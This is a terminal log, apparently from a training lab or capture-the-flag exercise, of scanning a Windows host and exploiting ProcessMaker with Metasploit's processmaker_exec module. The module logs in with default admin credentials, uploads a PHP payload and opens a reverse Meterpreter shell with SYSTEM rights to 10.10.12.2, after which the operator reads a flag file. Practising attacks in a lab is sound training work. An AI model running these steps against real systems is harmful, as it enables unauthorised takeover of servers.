```
root@attackdefense:~# cat /root/Desktop/target 
Target IP Address : 10.5.22.32
root@attackdefense:~# nmap -sV -O 10.5.22.32
Starting Nmap 7.70 ( https://nmap.org ) at 2023-08-13 14:01 IST
Nmap scan report for 10.5.22.32
Host is up (0.0019s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Apache httpd 2.2.23 ((Win32) PHP/5.2.14)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3306/tcp  open  mysql              MySQL (unauthorized)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49176/tcp open  msrpc              Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=8/13%OT=80%CT=1%CU=32553%PV=Y%DS=3%DC=I%G=Y%TM=64D8955
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=
OS:7)OPS(O1=M546NW8ST11%O2=M546NW8ST11%O3=M546NW8NNT11%O4=M546NW8ST11%O5=M5
OS:46NW8ST11%O6=M546ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=7F%W=2000%O=M546NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=7F%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=7F%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=7F%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=7F%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=7F%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=7F%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=7F%CD=Z)

Network Distance: 3 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.67 seconds
root@attackdefense:~# searchsploit processmaker
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                       |  Path
                                                                                                                                                     | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
ProcessMaker - Plugin Upload (Metasploit)                                                                                                            | exploits/php/webapps/44399.rb
ProcessMaker 3.0.1.7 - Multiple Vulnerabilities                                                                                                      | exploits/php/webapps/39872.txt
ProcessMaker Open Source - (Authenticated) PHP Code Execution (Metasploit)                                                                           | exploits/php/remote/29325.rb
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 12 database server: main.
                                                  

     .~+P``````-o+:.                                      -o+:.
.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
                                `...............`              `...-/////...`


                                  .::::::::::-.                     .::::::-
                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
================================================================================
=====================+--------------------------------+=========================
=====================| Session one died of dysentery. |=========================
=====================+--------------------------------+=========================
================================================================================

                     Press ENTER to size up the situation

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

                        Press SPACE BAR to continue



       =[ metasploit v5.0.74-dev                          ]
+ -- --=[ 1972 exploits - 1088 auxiliary - 338 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > workspace -a workspace
[*] Added workspace: workspace
[*] Workspace: workspace
msf5 > search processmaker

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/multi/http/processmaker_exec           2013-10-24       excellent  Yes    ProcessMaker Open Source Authenticated PHP Code Execution
   1  exploit/multi/http/processmaker_plugin_upload  2010-08-25       excellent  No     ProcessMaker Plugin Upload


msf5 > use exploit/multi/http/processmaker_exec
msf5 exploit(multi/http/processmaker_exec) > options

Module options (exploit/multi/http/processmaker_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   admin            yes       The password for ProcessMaker
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   USERNAME   admin            yes       The username for ProcessMaker
   VHOST                       no        HTTP server virtual host
   WORKSPACE  workflow         yes       The ProcessMaker workspace


Exploit target:

   Id  Name
   --  ----
   0   ProcessMaker Open Source 2.x (PHP Payload)


msf5 exploit(multi/http/processmaker_exec) > set rhosts 10.5.22.32
rhosts => 10.5.22.32
msf5 exploit(multi/http/processmaker_exec) > run

[*] Started reverse TCP handler on 10.10.12.2:4444 
[*] Authenticating as user 'admin'
[+] Authenticated as user 'admin'
[*] Sending payload '3hnC0GwGRg41PxcP.php' (1514 bytes)
[+] Payload sent successfully
[*] Retrieving file '3hnC0GwGRg41PxcP.php'
[*] Sending stage (38288 bytes) to 10.5.22.32
[*] Meterpreter session 1 opened (10.10.12.2:4444 -> 10.5.22.32:49245) at 2023-08-13 14:06:21 +0530
[+] Deleted 3hnC0GwGRg41PxcP.php

meterpreter > ls
Listing: C:\Users\Administrator\AppData\Roaming\ProcessMaker-2_5_0\processmaker\workflow\public_html
====================================================================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100666/rw-rw-rw-  438     fil   2013-05-15 21:44:05 +0530  Web.config
100666/rw-rw-rw-  27778   fil   2013-05-15 21:44:05 +0530  bootstrap.php
40777/rwxrwxrwx   131072  dir   2020-09-15 19:27:48 +0530  images
100666/rw-rw-rw-  234     fil   2020-09-15 19:29:08 +0530  index.html
40777/rwxrwxrwx   4096    dir   2020-09-15 19:27:48 +0530  skins
100666/rw-rw-rw-  40297   fil   2013-05-15 21:44:05 +0530  sysGeneric.php
100666/rw-rw-rw-  1101    fil   2013-05-15 21:44:05 +0530  sysUnnamed.php

meterpreter > cd /
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2020-09-10 15:20:33 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2013-06-18 17:48:29 +0530  BOOTNXT
40777/rwxrwxrwx   0       dir   2013-08-22 20:18:41 +0530  Documents and Settings
40777/rwxrwxrwx   0       dir   2013-08-22 21:22:33 +0530  PerfLogs
40555/r-xr-xr-x   4096    dir   2020-08-12 09:43:47 +0530  Program Files
40777/rwxrwxrwx   4096    dir   2020-09-15 19:29:49 +0530  Program Files (x86)
40777/rwxrwxrwx   4096    dir   2020-09-05 14:35:45 +0530  ProgramData
40777/rwxrwxrwx   0       dir   2020-09-05 09:16:57 +0530  System Volume Information
40555/r-xr-xr-x   4096    dir   2020-09-10 15:20:27 +0530  Users
40777/rwxrwxrwx   24576   dir   2020-09-10 14:40:34 +0530  Windows
100444/r--r--r--  398356  fil   2014-03-18 15:35:18 +0530  bootmgr
100666/rw-rw-rw-  32      fil   2020-09-15 19:26:18 +0530  flag.txt
100666/rw-rw-rw-  0       fil   2023-08-13 13:59:42 +0530  pagefile.sys

meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > sysinfo
Computer    : WIN-OMCNBKR66MN
OS          : Windows NT WIN-OMCNBKR66MN 6.2 build 9200
Meterpreter : php/windows
meterpreter > ipconfig
[-] Unknown command: ipconfig.
meterpreter > getuid
Server username: SYSTEM (0)
meterpreter > cat flag.txt
a3dcb4d229de6fde0db5686dee47145d
meterpreter >
```